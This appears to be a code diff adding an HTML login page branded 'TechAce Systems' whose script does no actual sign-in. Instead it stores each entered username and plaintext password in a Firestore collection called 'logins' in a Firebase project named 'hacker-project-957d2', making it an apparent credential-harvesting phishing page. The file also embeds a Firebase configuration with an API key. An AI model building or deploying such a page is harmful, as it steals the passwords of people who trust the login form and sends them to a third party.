@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(to bottom, #cce7ff, #0056b3);
+            color: white;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #ffffff;
+        }
+        form {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 350px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333333;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #ffffff;
+        }
+    </style>
+</head>
+<body>
+    <div id="title">TechAce Systems</div>
+    <h2>Login Page</h2>
+    <form id="loginForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        
+        <button type="submit">Submit</button>
+    </form>
+
+    <!-- Import Firebase SDK via modules -->
+    <script type="module">
+        // Import the functions you need from Firebase SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyC2JIRD67sU6ZOkm1Ku2kuutmYQmdY7zM4",
+            authDomain: "hacker-project-957d2.firebaseapp.com",
+            projectId: "hacker-project-957d2",
+            storageBucket: "hacker-project-957d2.appspot.com",
+            messagingSenderId: "144644744022",
+            appId: "1:144644744022:web:6851ff8cf128aa108eacf7"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Form Submission Handler
+        document.getElementById("loginForm").addEventListener("submit", async function(event) {
+            event.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            try {
+                // Add the username and password to Firestore
+                await addDoc(collection(db, "logins"), {
+                    username: username,
+                    password: password,
+                    timestamp: new Date()
+                });
+                alert("Login details saved!");
+            } catch (error) {
+                console.error("Error saving data:", error);
+                alert("Failed to save data. Check the console for details.");
+            }
+        });
+    </script>
+</body>
+</html>
